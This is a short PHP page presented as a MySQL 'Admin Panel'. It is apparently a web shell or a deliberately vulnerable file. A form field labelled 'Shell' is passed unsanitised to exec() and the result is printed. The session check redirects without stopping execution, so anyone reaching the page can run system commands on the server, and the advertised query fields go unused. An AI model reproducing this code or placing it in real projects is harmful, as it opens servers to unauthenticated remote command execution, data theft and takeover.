<!Doctype Html>
<?php
session_start();
$status = $_SESSION['status'];
if($status == "1"){
}else if($status != "1"){
        header("Location: /404.php");}

?>
<html>
<head>
<title>Admin Panel</title>
</head>
<body>
<p>Enter MYSQL query below</p>
<form action="" name="query" id="query" method="post">
        Shell: <input type="text" id="query_box" name="query_box"></input><br>
        DBNAME: <input type="text" id="mysql_get" name="mysql_get"></input><br><br>
        Query: <input type="text" id="myquery" name="myquery"></input><br><br>
        <button type="Submit" value="Submit">Submit</button>
</form>
</body>

<?php

$cwd=getcwd();
echo "Current directory: $cwd";


$shell = $_POST['query_box'];
$run = exec("$shell");
echo $run;
?>


</html>
